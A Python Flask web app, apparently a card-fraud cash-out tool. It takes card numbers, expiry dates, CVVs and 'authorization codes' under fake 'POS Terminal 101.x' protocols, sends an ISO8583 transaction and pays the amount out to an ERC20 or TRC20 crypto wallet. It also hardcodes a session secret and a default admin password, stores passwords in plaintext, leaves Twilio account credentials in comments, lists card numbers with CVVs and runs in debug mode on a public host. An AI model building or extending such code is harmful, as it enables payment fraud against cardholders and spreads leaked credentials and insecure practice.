from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash
import random, logging, qrcode, io, os, json, hashlib, re, socket
from datetime import datetime
from functools import wraps
# Assuming these are your custom modules for payout and ISO8583
# Make sure iso8583_crypto.py exists and contains these functions
from iso8583_crypto import send_erc20_payout, send_trc20_payout, send_iso8583_transaction, load_config
from xhtml2pdf import pisa
from werkzeug.security import generate_password_hash, check_password_hash
# from twilio.rest import Client # Removed: Twilio Client is no longer needed

app = Flask(__name__)
# IMPORTANT: Change this secret key in production! It's used for session security.
app.secret_key = 'blackrock_secret_key_8583'
logging.basicConfig(level=logging.INFO)

@app.context_processor
def inject_now():
    """Injects the current datetime into all templates."""
    return {'now': datetime.now}

# Constants for default admin user and file paths
USERNAME = "blackrockadmin"
DEFAULT_PASSWORD = "Br_3339" # Default password for the admin user
PASSWORD_FILE = "password.json" # File to store admin credentials
TX_LOG = "transactions.json" # File to log transaction history
# OTP_FILE = "otp.json" # Removed: OTP file is no longer relevant
CONFIG = load_config() # Loads configuration, likely for ISO8583 or crypto settings

# Removed: Twilio Configuration and Client Initialization
# TWILIO_SID = "ACdb98fb2972c2ed066994ddef56de1b6f"
# TWILIO_AUTH_TOKEN = "803463ddd413bc4d7375ac780d439195"
# TWILIO_NUMBER = "+13515297285"
# twilio_client = Client(TWILIO_SID, TWILIO_AUTH_TOKEN)

# Ensure password.json exists with default credentials if not present
if not os.path.exists(PASSWORD_FILE):
    with open(PASSWORD_FILE, "w") as f:
        json.dump({"admin_username": USERNAME, "admin_password": DEFAULT_PASSWORD}, f)

# Ensure transaction log file exists
if not os.path.exists(TX_LOG):
    with open(TX_LOG, "w") as f:
        json.dump([], f)

def check_password(input_username, input_password):
    """Checks if the provided username and password match the stored admin credentials."""
    with open(PASSWORD_FILE) as f:
        data = json.load(f)
    return (
        input_username == data.get("admin_username") and
        input_password == data.get("admin_password")
    )

def set_password(new_password):
    """Updates the admin password in the password.json file."""
    with open(PASSWORD_FILE) as f:
        data = json.load(f)
    data["admin_password"] = new_password
    with open(PASSWORD_FILE, "w") as f:
        json.dump(data, f, indent=2)

def login_required(f):
    """Decorator to ensure a user is logged in before accessing a route."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            flash("You must be logged in to access this page.")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

# ======================== Removed: OTP & Forgot Password Functionality ========================
# The send_otp_sms function and the /forgot-password and /reset-password routes
# have been entirely removed as per your request to skip all SMS/verification.

# ======================== Core Application Routes ========================
@app.route('/')
def home():
    """Redirects to the login page as the default route."""
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Handles user login."""
    if request.method == 'POST':
        user = request.form.get('username')
        passwd = request.form.get('password')
        if check_password(user, passwd):
            session['logged_in'] = True # Set session flag for logged-in status
            flash("Login successful!")
            return redirect(url_for('protocol'))
        flash("Invalid username or password.")
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Logs out the user by clearing the session."""
    session.clear()
    flash("You have been logged out.")
    return redirect(url_for('login'))

@app.route('/change-password', methods=['GET', 'POST'])
@login_required
def change_password():
    """Allows logged-in users to change their password."""
    if request.method == 'POST':
        current = request.form['current']
        new = request.form['new']
        with open(PASSWORD_FILE) as f:
            stored = json.load(f)
        if current != stored['admin_password']:
            return render_template('change_password.html', error="Current password incorrect.")
        set_password(new)
        flash("Password changed successfully.")
        return render_template('change_password.html', success="Password changed.")
    return render_template('change_password.html')

# ======================== Dummy Card Data and Protocols ========================
DUMMY_CARDS = {
    "4114755393849011": {"expiry": "0926", "cvv": "363", "auth": "1942", "type": "POS-101.1"},
    "4000123412341234": {"expiry": "1126", "cvv": "123", "auth": "4021", "type": "POS-101.1"},
    "4117459374038454": {"expiry": "1026", "cvv": "258", "auth": "384726", "type": "POS-101.4"},
    "4123456789012345": {"expiry": "0826", "cvv": "852", "auth": "495128", "type": "POS-101.4"},
    "5454957994741066": {"expiry": "1126", "cvv": "746", "auth": "627192", "type": "POS-101.6"},
    "6011000990131077": {"expiry": "0825", "cvv": "330", "auth": "8765", "type": "POS-101.7"},
    "3782822463101088": {"expiry": "1226", "cvv": "1059", "auth": "0000", "type": "POS-101.8"},
    "3530760473041099": {"expiry": "0326", "cvv": "244", "auth": "712398", "type": "POS-201.1"},
    "4114938274651920": {"expiry": "0926", "cvv": "463", "auth": "3127", "type": "POS-101.1"},
    "4001948263728191": {"expiry": "1026", "cvv": "291", "auth": "574802", "type": "POS-101.4"},
    "6011329481720394": {"expiry": "0825", "cvv": "310", "auth": "8891", "type": "POS-101.7"},
    "378282246310106":  {"expiry": "1226", "cvv": "1439", "auth": "0000", "type": "POS-101.8"},
    "3531540982734612": {"expiry": "0326", "cvv": "284", "auth": "914728", "type": "POS-201.1"},
    "5456038291736482": {"expiry": "1126", "cvv": "762", "auth": "695321", "type": "POS-201.3"},
    "4118729301748291": {"expiry": "1026", "cvv": "249", "auth": "417263", "type": "POS-201.5"}
}

PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval)": 4,
    "POS Terminal -101.4 (6-digit approval)": 6,
    "POS Terminal -101.6 (Pre-authorization)": 6,
    "POS Terminal -101.7 (4-digit approval)": 4,
    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
    "POS Terminal -201.1 (6-digit approval)": 6,
    "POS Terminal -201.3 (6-digit approval)": 6,
    "POS Terminal -201.5 (6-digit approval)": 6
}

FIELD_39_RESPONSES = {
    "05": "Do Not Honor",
    "14": "Terminal unable to resolve encrypted session state. Contact card issuer",
    "54": "Expired Card",
    "82": "Invalid CVV",
    "91": "Issuer Inoperative",
    "92": "Invalid Terminal Protocol"
}

# ======================== Payment Flow Routes ========================
@app.route('/protocol', methods=['GET', 'POST'])
@login_required
def protocol():
    """Allows the user to select a payment protocol."""
    if request.method == 'POST':
        selected = request.form.get('protocol')
        if selected not in PROTOCOLS:
            flash("Invalid protocol selected.")
            return redirect(url_for('rejected', code="92", reason=FIELD_39_RESPONSES["92"]))
        session['protocol'] = selected
        session['code_length'] = PROTOCOLS[selected] # Store expected auth code length
        return redirect(url_for('amount'))
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'])
@login_required
def amount():
    """Allows the user to enter the transaction amount."""
    if request.method == 'POST':
        session['amount'] = request.form.get('amount')
        return redirect(url_for('payout'))
    return render_template('amount.html')

@app.route('/payout', methods=['GET', 'POST'])
@login_required
def payout():
    """Allows the user to select payout method (ERC20/TRC20) and enter wallet."""
    if request.method == 'POST':
        method = request.form['method']
        wallet = request.form.get(f'{method.lower()}_wallet', '').strip()
        session['payout_type'] = method
        session['wallet'] = wallet
        return redirect(url_for('card'))
    return render_template('payout.html')

@app.route('/card', methods=['GET', 'POST'])
@login_required
def card():
    """Allows the user to enter card details."""
    if request.method == 'POST':
        pan = request.form['pan'].replace(" ", "") # Remove spaces from PAN
        expiry = request.form['expiry'].replace("/", "") # Remove slash from expiry
        cvv = request.form['cvv']
        session.update({'pan': pan, 'exp': expiry, 'cvv': cvv})
        return redirect(url_for('auth'))
    return render_template('card.html')

@app.route('/auth', methods=['GET', 'POST'])
@login_required
def auth():
    """Handles the authorization code input and initiates transaction processing."""
    expected_length = session.get('code_length', 6) # Default to 6 if not set
    if request.method == 'POST':
        code = request.form.get('auth')
        if len(code) != expected_length:
            return render_template('auth.html', warning=f"Authorization code must be {expected_length} digits.")
        
        # Generate unique transaction and ARN IDs
        txn_id = f"TXN{random.randint(100000, 999999)}"
        arn = f"ARN{random.randint(100000000000, 999999999999)}"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Update session with transaction details
        session.update({
            "txn_id": txn_id, "arn": arn, "timestamp": timestamp,
            "field39": "00", "auth_code": code # field39 "00" indicates approval initially
        })

        try:
            # Call your ISO8583 transaction processing function
            # This function should handle communication with the ISO8583 server
            send_iso8583_transaction(session)

            # Perform crypto payout if ISO8583 transaction is successful
            if session['payout_type'] == 'ERC20':
                send_erc20_payout(session['wallet'], float(session['amount']))
            elif session['payout_type'] == 'TRC20':
                send_trc20_payout(session['wallet'], float(session['amount']))

            # Removed: Twilio SMS sending for success
            print(f"Transaction successful. TXN ID: {txn_id}")

        except Exception as e:
            # Removed: Twilio SMS sending for failure
            print(f"Transaction failed for TXN ID: {txn_id}. Error: {e}")
            flash(f"Payout Error: {str(e)}")
            # Redirect to rejected page with error details
            return redirect(url_for('rejected', code="91", reason=str(e)))

        # Log successful transaction to file
        with open(TX_LOG, "r+") as f:
            history = json.load(f)
            history.append({
                "txn_id": txn_id, "arn": arn, "amount": session['amount'],
                "timestamp": timestamp, "wallet": session['wallet'],
                "payout": session['payout_type'], "card": session['pan'][-4:] # Log last 4 digits of card
            })
            f.seek(0) # Rewind to the beginning of the file
            json.dump(history, f, indent=2) # Write updated history

        # Redirect to success page
        return redirect(url_for('success'))
    return render_template('auth.html', expected_length=expected_length) # Pass expected_length to template

@app.route('/success')
@login_required
def success():
    """Displays transaction success details."""
    return render_template('success.html',
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan", "")[-4:],
        amount=session.get("amount"),
        timestamp=session.get("timestamp")
    )

@app.route('/receipt')
@login_required
def receipt():
    """Displays a printable receipt."""
    return render_template("receipt.html", **session)

@app.route('/receipt.pdf')
@login_required
def receipt_pdf():
    """Generates and serves a PDF receipt."""
    html = render_template("receipt.html", **session)
    result = io.BytesIO()
    pisa.CreatePDF(io.StringIO(html), dest=result)
    result.seek(0)
    return send_file(result, download_name="receipt.pdf", as_attachment=True, mimetype='application/pdf')

@app.route('/transactions')
@login_required
def transactions():
    """Displays a log of all past transactions."""
    with open(TX_LOG) as f:
        data = json.load(f)
    return render_template("transactions.html", transactions=data)

@app.route('/rejected')
def rejected():
    """Displays transaction rejection details."""
    return render_template('rejected.html',
        code=request.args.get("code"),
        reason=request.args.get("reason", "Transaction Declined")
    )

@app.route('/offline')
@login_required
def offline():
    """Placeholder for an offline mode page."""
    return render_template('offline.html')

if __name__ == '__main__':
    # Run the Flask application
    # For Render deployment, Render will set the PORT environment variable.
    # You should use os.environ.get('PORT', 10000) for the port.
    HOST = '0.0.0.0'
    PORT = int(os.environ.get('PORT', 10000))
    print(f"App running on http://{HOST}:{PORT}")
    app.run(host=HOST, port=PORT, debug=True) # Set debug=False for production
